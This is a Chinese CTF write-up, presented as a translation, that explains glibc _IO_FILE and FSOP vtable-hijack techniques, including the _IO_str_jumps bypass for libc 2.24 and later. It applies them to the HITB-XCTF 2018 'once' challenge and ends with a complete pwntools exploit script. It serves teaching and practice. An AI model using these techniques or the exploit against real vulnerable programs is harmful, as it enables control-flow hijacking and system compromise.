# 通过一道pwn题探究 `_IO_FILE` 结构攻击利用

##### 译文声明
本文是翻译文章，译文仅供参考，具体内容表达及含义以原文为准。

## 前言
近期学习了关于 `_IO_FILE` 的知识，发现这一知识点在 CTF 竞赛中较为常见。本文旨在总结 `_IO_FILE` 相关的知识点，并通过一个具体的题目（HITB-XCTF 2018 GSEC once）来加深理解。首先将介绍 `_IO_FILE` 的结构体，然后讨论其利用方法，最后通过实际题目进行演示。

## `libc2.23` 版本的 `_IO_FILE` 利用
这是一种控制流劫持技术，攻击者可以利用程序中的漏洞覆盖文件指针，使其指向可控区域，从而改写结构体中的关键数据或覆盖虚表（vtable），进而控制程序执行流。

### `_IO_FILE` 结构体
在 CTF 中，调用 `setvbuf()` 后，`stdin`、`stdout` 和 `stderr` 通常位于 libc 的数据段，而其他大多数 `FILE` 结构体则保存在堆上。其定义如下：

```c
struct _IO_FILE {
    int _flags;        /* 高位字节为 _IO_MAGIC；其余部分为标志 */
#define _IO_file_flags _flags
    char* _IO_read_ptr;    /* 当前读指针 */
    char* _IO_read_end;    /* 读取区域的结束位置 */
    char* _IO_read_base;    /* 回退+读取区域的起始位置 */
    char* _IO_write_base;    /* 写入区域的起始位置 */
    char* _IO_write_ptr;    /* 当前写指针 */
    char* _IO_write_end;    /* 写入区域的结束位置 */
    char* _IO_buf_base;    /* 预留区域的起始位置 */
    char* _IO_buf_end;    /* 预留区域的结束位置 */
    char *_IO_save_base; /* 指向非当前读取区域的起始位置 */
    char *_IO_backup_base;  /* 指向备份区域的第一个有效字符 */
    char *_IO_save_end; /* 指向非当前读取区域的结束位置 */
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
#if 0
    int _blksize;
#else
    int _flags2;
#endif
    _IO_off_t _old_offset; /* 过去使用的是 _offset，但现在它太小了 */
#define __HAVE_COLUMN /* 临时 */
    unsigned short _cur_column; /* pbase() 的列号加 1；0 表示未知 */
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

`_IO_FILE` 结构体通过 `struct _IO_FILE *_chain` 链接成一个链表，在 64 位程序中其偏移量为 0x60。链表头部由 `_IO_list_all` 指针表示。此外，`_IO_FILE` 结构体还被一个 `_IO_FILE_plus` 结构体包裹，其定义如下：

```c
struct _IO_FILE_plus {
    _IO_FILE file;
    IO_jump_t *vtable;
}
```

其中包含了一个重要的虚表 `*vtable`，它是 `IO_jump_t` 类型的指针，偏移量为 0xd8，保存了一些关键的函数指针。我们通常会修改这里的指针来控制程序执行流。`IO_jump_t` 的定义如下：

```c
struct _IO_jump_t {
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

### 利用方法（FSOP）
这种利用方法通过程序中的漏洞（如未排序的 bin 攻击）覆盖 `_IO_list_all`（全局变量），使链表指向可控区域，从而改写虚表 `*vtable`。触发该漏洞的方式是调用 `_IO_flush_all_lockp()` 函数，该函数会在以下三种情况下被调用：
1. 当 libc 执行 `abort` 流程时。
2. 当执行 `exit` 函数时。
3. 当执行流从 `main` 函数返回时。

当 glibc 检测到内存错误时，会依次调用以下函数路径：`malloc_printerr -> libc_message -> __GI_abort -> _IO_flush_all_lockp -> _IO_OVERFLOW`。

为了成功控制执行流，还需要伪造一些数据。例如，可以通过设置 `fp->_mode = 0` 和 `fp->_IO_write_ptr > fp->_IO_write_base` 来通过验证。

## 新版本下的利用
新版本（libc2.24 及以上）引入了防御机制，检查 vtable 的合法性，不能再像之前那样直接将 vtable 改为堆地址。但 `_IO_str_jumps` 是一个符合条件的 vtable，将其改为 `_IO_str_jumps` 即可绕过检查。其定义如下：

```c
const struct _IO_jump_t _IO_str_jumps libio_vtable = {
    JUMP_INIT_DUMMY,
    JUMP_INIT(finish, _IO_str_finish),
    JUMP_INIT(overflow, _IO_str_overflow),
    JUMP_INIT(underflow, _IO_str_underflow),
    JUMP_INIT(uflow, _IO_default_uflow),
    JUMP_INIT(pbackfail, _IO_str_pbackfail),
    JUMP_INIT(xsputn, _IO_default_xsputn),
    JUMP_INIT(xsgetn, _IO_default_xsgetn),
    JUMP_INIT(seekoff, _IO_str_seekoff),
    JUMP_INIT(seekpos, _IO_default_seekpos),
    JUMP_INIT(setbuf, _IO_default_setbuf),
    JUMP_INIT(sync, _IO_default_sync),
    JUMP_INIT(doallocate, _IO_default_doallocate),
    JUMP_INIT(read, _IO_default_read),
    JUMP_INIT(write, _IO_default_write),
    JUMP_INIT(seek, _IO_default_seek),
    JUMP_INIT(close, _IO_default_close),
    JUMP_INIT(stat, _IO_default_stat),
    JUMP_INIT(showmanyc, _IO_default_showmanyc),
    JUMP_INIT(imbue, _IO_default_imbue)
};
```

其中 `IO_str_overflow` 函数会调用 `FILE + 0xe0` 处的地址。此时只需将虚表覆盖为 `_IO_str_jumps`，并将偏移 0xe0 处设置为 one_gadget 即可。

另一种方法是利用 `io_finish` 函数。类似地，`io_finish` 会以 `IO_buf_base` 处的值为参数跳转至 `FILE + 0xe8` 处的地址。执行 `fclose(fp)` 时会调用此函数，但大多数情况下可能不会有 `fclose(fp)`，这时仍可以利用异常来调用 `io_finish`。异常时调用 `IO_OVERFLOW` 是根据 `IO_str_overflow` 在虚表中的偏移找到的，我们可以设置 vtable 为 `_IO_str_jumps - 0x8`，异常时会调用 `io_finish` 函数。

## 具体题目（HITB-XCTF 2018 GSEC once）

### 1. 简单运行程序，查看保护
程序开启了 CANARY 和 NX 保护，不能改写 GOT 表。

### 2. 使用 IDA 反编译
当输入一个不合法的选项时，程序会输出 `puts` 的地址，用于泄露 libc 的基地址。

- 第一个函数创建一个 chunk 保存数据。
- 第二个和第三个函数只能执行一次，存在任意地址写漏洞。可以利用第二个函数改写 `off_202038 + 3d` 为 `_IO_list_all - 0x10`，然后分别执行第三和第一个函数，最终使 `_IO_list_all` 指向 `0x555555757040` 的位置。
- 第四个函数主要用于对堆块的操作，可以利用该函数伪造一个 `_IO_FILE` 结构。

### 3. 具体过程
1. 泄露 libc，输入“6”即可得到 `puts` 函数的地址，然后计算出 libc 基地址。

    ```python
    p.recvuntil('>')
    p.sendline('6')
    p.recvuntil('Invalid choicen')
    ioputadd = int(p.recvuntil('>', drop=True), 16)
    print(hex(ioputadd))
    libcbase = ioputadd - libc.symbols['_IO_puts']
    print(hex(libcbase))
    one = libcbase + 0x4526a
    ```

2. 利用任意地址写漏洞改写 `_IO_list_all` 为堆的地址。

    ```python
    p.sendline('1')
    p.recvuntil('>')
    p.sendline('2')
    ioall = libcbase + libc.symbols['_IO_list_all'] - 0x10
    print(hex(ioall))
    payload = p64(ioall) * 4
    p.sendline(payload)
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('>')
    p.sendline('1')
    ```

3. 利用第四个函数伪造 `_IO_FILE` 结构体，改写 vtable 为 `_IO_str_jumps`，并将 `file + 0xe0` 设置为 one_gadget。

    ```python
    p.sendline('4')
    p.sendline('1')
    p.recvuntil('input size:n')
    p.sendline('256')
    jump = libcbase + libc.symbols['_IO_file_jumps'] + 0xc0  # _IO_str_jumps
    p.recvuntil('>')
    p.sendline('2')
    payload = 'A' * 0xa8 + p64(jump) + p64(one)
    payload += 'A' * (0x100 - len(payload))
    p.sendline(payload)
    p.recvuntil('>')
    p.sendline('4')
    ```

4. 输入“5”，执行 `exit()` 函数触发 one_gadget。

    ```python
    p.recvuntil('>')
    p.sendline('5')
    p.interactive()
    ```

## 小结
本文总结了 `_IO_FILE` 结构的一些知识点，并通过具体题目进行了演示。如有不足之处，欢迎指正。

## 完整 EXP
```python
from pwn import *

p = process('./once')
elf = ELF('once')
libc = ELF('libc6_2.23-0ubuntu10_amd64.so')

p.recvuntil('>')
p.sendline('6')
p.recvuntil('Invalid choicen')
ioputadd = int(p.recvuntil('>', drop=True), 16)
print(hex(ioputadd))
libcbase = ioputadd - libc.symbols['_IO_puts']
print(hex(libcbase))
one = libcbase + 0x4526a

p.sendline('1')
p.recvuntil('>')
p.sendline('2')
ioall = libcbase + libc.symbols['_IO_list_all'] - 0x10
print(hex(ioall))
payload = p64(ioall) * 4
p.sendline(payload)
p.recvuntil('>')
p.sendline('3')
p.recvuntil('>')
p.sendline('1')
p.recvuntil('>')
p.sendline('4')
p.sendline('1')
p.recvuntil('input size:n')
p.sendline('256')
jump = libcbase + libc.symbols['_IO_file_jumps'] + 0xc0  # _IO_str_jumps
p.recvuntil('>')
p.sendline('2')
payload = 'A' * 0xa8 + p64(jump) + p64(one)
payload += 'A' * (0x100 - len(payload))
p.sendline(payload)
p.recvuntil('>')
p.sendline('4')
raw_input()
p.recvuntil('>')
p.sendline('5')
p.interactive()
```

希望这篇优化后的文章能帮助你更好地理解和掌握 `_IO_FILE` 结构的攻击利用方法。